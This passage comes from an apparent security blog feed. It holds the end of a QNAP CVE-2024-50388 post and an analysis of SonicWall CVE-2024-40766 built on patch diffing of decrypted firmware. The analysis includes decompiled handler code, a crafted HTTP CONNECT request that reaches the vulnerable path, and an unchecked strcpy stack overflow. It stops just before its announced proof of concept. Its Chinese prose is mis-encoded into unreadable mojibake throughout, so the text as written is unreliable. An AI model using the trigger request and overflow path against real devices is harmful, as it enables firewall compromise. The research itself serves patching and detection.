<p>ç³»ç»Ÿæ—¥å¿—ä¸­å¿ƒä¼¼ä¹å¹¶ä¸è®°å½•å’Œ rsync ç›¸å…³çš„æ—¥å¿—ï¼Œå› æ­¤æ’æŸ¥ CVE-2024-50388 çš„åˆ©ç”¨å¯ä»¥å…³æ³¨è®¾å¤‡æ˜¯å¦å¤–è”äº†å¼‚å¸¸ IP åœ°å€ï¼Œç³»ç»Ÿæ˜¯å¦å­˜åœ¨å¯ç–‘æ–‡ä»¶ç­‰ã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸¤ä¸ªæ¼æ´åˆ†åˆ«å½±å“ SMB å’Œ rsync æœåŠ¡ï¼Œè¿™äº›æœåŠ¡å¯èƒ½ä¸ä¼šå¼€æ”¾åœ¨å…¬ç½‘ç¯å¢ƒï¼Œå—å½±å“çš„æ’ä»¶ç‰ˆæœ¬ä¹Ÿæœ‰é™ã€‚æ­¤å¤–ï¼ŒQNAP åœ¨æ¼æ´è¢«å‘ç°åè¿…é€Ÿé‡‡å–äº†è¡ŒåŠ¨ï¼Œæ¨å‡ºæ–°ç‰ˆæœ¬è¿›è¡Œä¿®å¤ã€‚è€Œä¸”ï¼Œå½“ NAS è¿æ¥ç½‘ç»œæ—¶ï¼Œè¿˜ä¼šè‡ªåŠ¨ä¸‹è½½ Hot Patch ä½œä¸ºä¸´æ—¶ç¼“è§£æ–¹æ¡ˆã€‚åœ¨è¿™äº›åŠªåŠ›ä¸‹ï¼Œè¿™äº›æ¼æ´è¢«åˆ©ç”¨çš„å¯èƒ½æ€§è¾ƒä½ï¼Œä½†ä¾ç„¶å»ºè®®ç”¨æˆ·å°†ç›¸å…³ç»„ä»¶å‡çº§åˆ°æœ€æ–°ç‰ˆï¼Œç¡®ä¿å®‰å…¨ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a class="link"   href="https://unix.stackexchange.com/questions/11376/what-does-double-dash-double-hyphen-mean" >https://unix.stackexchange.com/questions/11376/what-does-double-dash-double-hyphen-mean<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-41" >https://www.qnap.com/en/security-advisory/qsa-24-41<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-42" >https://www.qnap.com/en/security-advisory/qsa-24-42<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bleepingcomputer.com/news/security/qnap-patches-second-zero-day-exploited-at-pwn2own-to-get-root/" >https://www.bleepingcomputer.com/news/security/qnap-patches-second-zero-day-exploited-at-pwn2own-to-get-root/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://rsync.samba.org/how-rsync-works.html" >https://rsync.samba.org/how-rsync-works.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-40766</title>
    <url>/2024/09/05/CVE-2024-40766/</url>
    <content><![CDATA[<p>2024 å¹´ 8 æœˆ 23 æ—¥ï¼ŒSonicwall å‘å¸ƒäº† CVE-2024-40766 æ¼æ´é¢„è­¦ä¿¡æ¯ï¼Œè¯¥æ¼æ´è¢«æè¿°ä¸º â€œè®¿é—®æ§åˆ¶ä¸å½“â€ã€‚å¯èƒ½é€ æˆæœªæˆæƒè®¿é—®æˆ–å¯¼è‡´ç³»ç»Ÿå´©æºƒï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œç®€è¦åˆ†æã€‚</p>
<p><strong>è¯¥æ¼æ´å¯èƒ½å·²è¢«åœ¨é‡åˆ©ç”¨ï¼Œå»ºè®®ç”¨æˆ·ç«‹å³å®‰è£…è¡¥ä¸ï¼Œæ£€æŸ¥è®¾å¤‡ SSLVPN ç”¨æˆ·æƒ…å†µï¼Œå¹¶åº”ç”¨ SonicWall æä¾›çš„ç¼“è§£æªæ–½ã€‚</strong></p>
<span id="more"></span>

<h2 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h2><p>æ ¹æ®å…¬å¼€ä¿¡æ¯ï¼Œè¯¥æ¼æ´ä¼¼ä¹ä»…å½±å“ SonicWall é˜²ç«å¢™çš„ç¡¬ä»¶è®¾å¤‡ï¼Œå½±å“ GEN5ã€GEN6 ä»¥åŠ GEN7 å°äºç­‰äº 7.0.1-5035 ç‰ˆæœ¬ã€‚</p>
<p>å…¬å‘Šæè¿°è¿™å¯èƒ½æ˜¯ä¸€ä¸ªéªŒè¯ç»•è¿‡æ¼æ´ï¼Œä½†æˆ‘ä»¬æ‰¾åˆ° GEN5 ç³»åˆ—çš„æ›´æ–°å…¬å‘Šï¼Œå…¶ä¸­æåˆ°æ–°ç‰ˆæœ¬ä»…è¿›è¡Œäº†ä¸€é¡¹ä¿®å¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SonicOS unauthenticated stack-based buffer overflow vulnerability (SNWLD-2024-0015). GEN5-73</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥è¿™ä¸ªæ¼æ´å¯èƒ½æ˜¯ä¸€ä¸ªæœªæˆæƒæ ˆæº¢å‡ºï¼Œé€šè¿‡æº¢å‡ºè¦†ç›–äº†æŸäº›å…³é”®ç»“æ„å¯¼è‡´èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>GEN5 ç³»åˆ—æ›´æ–°çš„é¡¹ç›®è¾ƒå°‘ï¼Œæˆ‘ä»¬é€‰æ‹©å®ƒä¸ºç›®æ ‡è¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼ŒGEN5 åªæä¾› sig æ ¼å¼çš„å‡çº§åŒ…ï¼Œä½†é€šè¿‡ä¹‹å‰çš„æ–‡ç« å·²ç»çŸ¥é“ sig æ–‡ä»¶çš„è§£å¯†æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥é€‰æ‹©æœ€è¿‘ä¸¤ä¸ªç‰ˆæœ¬è§£å¯†æ¥åˆ†æã€‚</p>
<p>è§£å¯† 5.9.2.14-12o å’Œ 5.9.2.14-13o ä¸¤ä¸ªç‰ˆæœ¬çš„å›ºä»¶ï¼Œä½¿ç”¨ binwalk åˆ†æè§£å¯†åå›ºä»¶æ ¼å¼</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">405           0x195           Zlib compressed data, default compression</span><br><span class="line">7517022       0x72B35E        Squashfs filesystem, big endian, version 3.0, size: 3973792 bytes, 1439 inodes, blocksize: 16384 bytes, created: 2022-04-07 09:48:41</span><br><span class="line">11494238      0xAF635E        ELF, 32-bit N32 MSB MIPS32 executable, MIPS, version 1 (SYSV)</span><br><span class="line">14003246      0xD5AC2E        CRC32 polynomial table, big endian</span><br><span class="line">14004293      0xD5B045        Copyright string: &quot;Copyright 1995-2002 Jean-loup Gailly &quot;</span><br><span class="line">14007301      0xD5BC05        Copyright string: &quot;Copyright 1995-2002 Mark Adler &quot;</span><br><span class="line">14125788      0xD78ADC        HTML document header</span><br><span class="line">14126380      0xD78D2C        HTML document footer</span><br><span class="line">14139070      0xD7BEBE        PEM certificate</span><br><span class="line">14140150      0xD7C2F6        PEM certificate</span><br><span class="line">14141486      0xD7C82E        PEM RSA private key</span><br><span class="line">14157054      0xD804FE        Ubiquiti firmware header, third party, ~CRC32: 0x0, version: &quot;SSL_malloc Error&quot;</span><br><span class="line">14265550      0xD9ACCE        SHA256 hash constants, big endian</span><br><span class="line">14275478      0xD9D396        AES Inverse S-Box</span><br><span class="line">14297270      0xDA28B6        Base64 standard index table</span><br><span class="line">14654307      0xDF9B63        gzip compressed data, has comment: &quot;&quot;, from FAT filesystem (MS-DOS, OS/2, NT), last modified: 1970-01-13 13:14:07 (bogus date)</span><br><span class="line">14713500      0xE0829C        Intel x86 or x64 microcode, sig 0x0000b806, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14714780      0xE0879C        Intel x86 or x64 microcode, sig 0x3f800833, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 16384</span><br><span class="line">14716412      0xE08DFC        Intel x86 or x64 microcode, sig 0x00002879, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14717308      0xE0917C        Intel x86 or x64 microcode, sig 0x3f8068aa, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 16384</span><br><span class="line">14717884      0xE093BC        Intel x86 or x64 microcode, sig 0x000060db, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14722300      0xE0A4FC        Intel x86 or x64 microcode, sig 0x0000b0ce, pf_mask 0x00, 1F00-02-10, rev 0x1d00, size 2048</span><br><span class="line">14723036      0xE0A7DC        Intel x86 or x64 microcode, sig 0x00006004, pf_mask 0x00, 1F00-03-10, rev 0x1d00, size 2048</span><br><span class="line">14725724      0xE0B25C        Intel x86 or x64 microcode, sig 0xffc0000e, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 12289</span><br><span class="line">14725852      0xE0B2DC        Intel x86 or x64 microcode, sig 0x0000d03b, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 2048</span><br><span class="line">14727740      0xE0BA3C        Intel x86 or x64 microcode, sig 0x0000a0a3, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 2048</span><br><span class="line">14731164      0xE0C79C        Intel x86 or x64 microcode, sig 0x0000889f, pf_mask 0x00, 1F00-05-10, rev 0x1d00, size 2048</span><br><span class="line">14750300      0xE1125C        Intel x86 or x64 microcode, sig 0x0000b063, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 2048</span><br><span class="line">14750460      0xE112FC        Intel x86 or x64 microcode, sig 0x0780d86a, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 53248</span><br><span class="line">14750652      0xE113BC        Intel x86 or x64 microcode, sig 0x7f8088a5, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 20480</span><br><span class="line">14751036      0xE1153C        Intel x86 or x64 microcode, sig 0x000078c5, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 2048</span><br><span class="line">14791868      0xE1B4BC        Intel x86 or x64 microcode, sig 0x008068f1, pf_mask 0x00, 1F00-12-10, rev 0x1d00, size 4096</span><br><span class="line">14793532      0xE1BB3C        Intel x86 or x64 microcode, sig 0x0380a053, pf_mask 0x00, 1F00-13-10, rev 0x1d00, size 16384</span><br><span class="line">14794236      0xE1BDFC        Intel x86 or x64 microcode, sig 0x00006867, pf_mask 0x00, 1F00-13-10, rev 0x1d00, size 2048</span><br><span class="line">14798108      0xE1CD1C        Intel x86 or x64 microcode, sig 0x1f80c050, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 12288</span><br><span class="line">14798300      0xE1CDDC        Intel x86 or x64 microcode, sig 0x3f80c064, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 57344</span><br><span class="line">14798396      0xE1CE3C        Intel x86 or x64 microcode, sig 0xff80f06f, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 1</span><br><span class="line">14798428      0xE1CE5C        Intel x86 or x64 microcode, sig 0x00804875, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 8192</span><br><span class="line">14812508      0xE2055C        Intel x86 or x64 microcode, sig 0xffc0288b, pf_mask 0x00, 1F00-16-10, rev 0x1d00, size 20480</span><br><span class="line">14814428      0xE20CDC        Intel x86 or x64 microcode, sig 0x000040e4, pf_mask 0x00, 1F00-16-10, rev 0x1d00, size 2048</span><br><span class="line">14817340      0xE2183C        Intel x86 or x64 microcode, sig 0x000000b9, pf_mask 0x00, 1F00-17-10, rev 0x1d00, size 2048</span><br><span class="line">14825500      0xE2381C        Intel x86 or x64 microcode, sig 0x0380c058, pf_mask 0x00, 1F00-19-10, rev 0x1d00, size 8192</span><br></pre></td></tr></table></figure></div>

<p>ç›´æ¥è§£å‹ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªå«åš 195 çš„ ELF æ–‡ä»¶ï¼Œè¿™ä¸ªå®é™…ä¸Šå°±æ˜¯ç³»ç»Ÿä¸»è¦ç¨‹åºï¼Œå†…éƒ¨å®ç°äº†å¾ˆå¤šåŠŸèƒ½ï¼ŒåŒ…æ‹¬ç®¡ç†ç«¯å£ WEB ç›¸å…³åŠŸèƒ½ã€‚</p>
<p>åˆ©ç”¨ Bindiff å¯¹æ¯”æ–°æ—§ä¸¤ä¸ªç¨‹åºï¼Œå¾—åˆ°ç»“æœæ˜¾ç¤ºå·®å¼‚å¾ˆå°ï¼Œä»…æœ‰ 20 ä½™ä¸ªå‡½æ•°å‘ç”Ÿå˜åŒ–ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2024-40766-1.png"
                     
                ></p>
<p>é€ä¸ªåˆ†æå‘ç”Ÿå˜åŒ–çš„å‡½æ•°ï¼Œå®šä½åˆ°ç–‘ä¼¼æ¼æ´ç‚¹ï¼Œä»£ç åˆ—ä¸¾å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ—§ç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">if</span> ( *(v36 + <span class="number">32</span>) == <span class="number">6LL</span> )             <span class="comment">// CONNECT ç±»å‹</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aWxaappliance_0) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = woHandleSshConnect(v43, v42, v44) &lt; <span class="number">0</span>;</span><br><span class="line">    LABEL_361:</span><br><span class="line">      v182 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 )</span><br><span class="line">        v182 = <span class="number">0</span>;</span><br><span class="line">      v220 = v182;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_367;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aSonicpoint_0) )<span class="comment">// (sonicpoint)-&gt;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v46 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v47 = v32;</span><br><span class="line">        v48 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v46 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v47 = v32;</span><br><span class="line">        v48 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = spnHandleSshConnect(v47, v46, v48) &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_361;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–°ç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">if</span> ( *(v36 + <span class="number">32</span>) == <span class="number">6LL</span> )             <span class="comment">// CONNECT ç±»å‹</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aSonicpoint_0) &amp;&amp; sub_829B0BDC(v32) &amp;&amp; sub_829B1D20(v32) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = spnHandleSshConnect(v43, v42, v44) &lt; <span class="number">0</span>;</span><br><span class="line">    LABEL_357:</span><br><span class="line">      v179 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 )</span><br><span class="line">        v179 = <span class="number">0</span>;</span><br><span class="line">      v217 = v179;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_363;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹æ¯”å¯ä»¥å‘ç°æ–°ç‰ˆæœ¬å»æ‰äº†è°ƒç”¨ woHandleSshConnect çš„ä»£ç ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨ spnHandleSshConnect ä¹‹å‰æ–°å¢äº†è°ƒç”¨å‡½æ•° sub_829B0BDC å’Œ sub_829B1D20</p>
<p>å®é™…ä¸Šè¿™ä¸ªå‡½æ•°æ˜¯å¤„ç†å‘å¾€ç®¡ç†ç«¯å£ HTTP è¯·æ±‚çš„å…¥å£ç‚¹ï¼Œv36 + 32 è¡¨ç¤ºå½“å‰çš„è¯·æ±‚æ–¹æ³•ï¼Œ6 è¡¨ç¤º CONNECT æ–¹æ³•ï¼Œv36 + 36 è¡¨ç¤ºè¯·æ±‚çš„ URLï¼Œv36 + 52 è¡¨ç¤ºè¯·æ±‚å¤´ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“å‘é€ç±»ä¼¼ä»¥ä¸‹è¯·æ±‚æ—¶ï¼Œä¼šè§¦å‘ woHandleSshConnect å‡½æ•°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONNECT /test?(wxaappliance)-&gt;aaa HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Proxy-Authorization: test</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">woHandleSshConnect</span><span class="params">(__int64 unknow, __int64 maybe_query_string, __int64 maybe_header)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strstr</span>(maybe_query_string, aWxaappliance_0);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    param = (v5 + maybe_strlen(aWxaappliance_0));</span><br><span class="line">    v8 = sub_82860ACC(param, maybe_header, v14);</span><br><span class="line">    v9 = sub_82853D40(unknow, param, v8, <span class="number">0LL</span>);</span><br><span class="line">    v10 = v9;</span><br><span class="line">    v11 = v9 &lt; <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = sub_8286EA04(<span class="number">3LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( sub_8286EC70(v12, <span class="number">1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(v12 + <span class="number">76</span>) = v10;</span><br><span class="line">        *(v12 + <span class="number">72</span>) = unknow;</span><br><span class="line">        sub_825E0284(unknow, <span class="number">65539LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        sub_82D9AB58(v13, <span class="string">&quot;tSslvpnProxy%d&quot;</span>, unknow);</span><br><span class="line">        *(v12 + <span class="number">84</span>) = sub_827ED488(v13, <span class="number">50LL</span>, <span class="number">0LL</span>, <span class="number">20000LL</span>, sub_82852A34, v12, <span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LOG(aNotice, aWohandlesshcon, <span class="number">2364LL</span>) )</span><br><span class="line">      sub_82330978(<span class="string">&quot;in %s error: pQueryString NULL   \n&quot;</span>, aWohandlesshcon_0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>woHandleSshConnect å‡½æ•°åˆä¼šè°ƒç”¨ sub_82860ACC</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_82860ACC</span><span class="params">(__int64 buf, __int64 a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_8284D554(buf, v13);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆä¼šè°ƒç”¨ sub_8284D554 å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_8284D554</span><span class="params">(__int64 buf, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !buf || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *buf == <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v13, <span class="number">0LL</span>, <span class="number">124LL</span>);</span><br><span class="line">    maybe_strnpy(&amp;v13, buf, <span class="number">123LL</span>);</span><br><span class="line">    v5 = <span class="built_in">strchr</span>(&amp;v13, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    v6 = v5;</span><br><span class="line">    v7 = v5 == <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = (v6 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *v8 == <span class="number">58LL</span> )</span><br><span class="line">        *v2 = maybe_atoi((v8 + <span class="number">1</span>));</span><br><span class="line">      *(v8 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      v9 = maybe_strlen(buf);</span><br><span class="line">      maybe_strnpy(buf, v14, v9 - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>    <span class="comment">// [1]</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    v11 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &amp;&amp; <span class="built_in">strchr</span>(buf, <span class="string">&#x27;.&#x27;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    v7 = sub_825DC8E8(buf) != <span class="number">0</span>;    <span class="comment">// [2]</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    v12 = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    v11 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      *v2 = maybe_atoi((v11 + <span class="number">1</span>));</span><br><span class="line">      *v11 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å½“ buf å³ Query String ä¸ä»¥ <code>[</code> å­—ç¬¦å¼€å¤´æ—¶ï¼Œæ¥åˆ° <code>[1]</code> å¤„ï¼Œæ¥ç€ä¼šåœ¨ <code>[2]</code> å¤„è°ƒç”¨ sub_825DC8E8 å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_825DC4B8</span><span class="params">(__int64 buf, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="type">char</span> v32[<span class="number">46</span>]; <span class="comment">// [sp+10h] [-50h] BYREF</span></span><br><span class="line">  _BYTE v33[<span class="number">16</span>]; <span class="comment">// [sp+40h] [-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [sp+50h] [-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+54h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+58h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = v32;</span><br><span class="line">  v35 = a2;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v32, <span class="number">0LL</span>, <span class="keyword">sizeof</span>(v32));</span><br><span class="line">  <span class="keyword">if</span> ( !buf || !v35 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_834DE5C8 )</span><br><span class="line">      sub_82D9B0B8(aState1NullPoin);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v32, buf);    <span class="comment">// [3]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¾ˆæ˜æ˜¾åœ¨ <code>[3]</code> å¤„ï¼Œä»£ç ä¼šè°ƒç”¨ strcpy å°è¯•å°†ç”¨æˆ·å¯æ§çš„æ•°æ®æ‹·è´åˆ° v32ï¼Œè€Œ v32 æ˜¯ä¸€ä¸ªä½äº stack çš„å›ºå®šé•¿åº¦çš„ç¼“å†²åŒºï¼Œåœ¨æ‹·è´æ—¶ç¼ºå°‘é•¿åº¦éªŒè¯ï¼Œè¿™å°†å¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<p>ä¸€ä¸ªå¯èƒ½çš„ POC å¦‚ä¸‹</p>
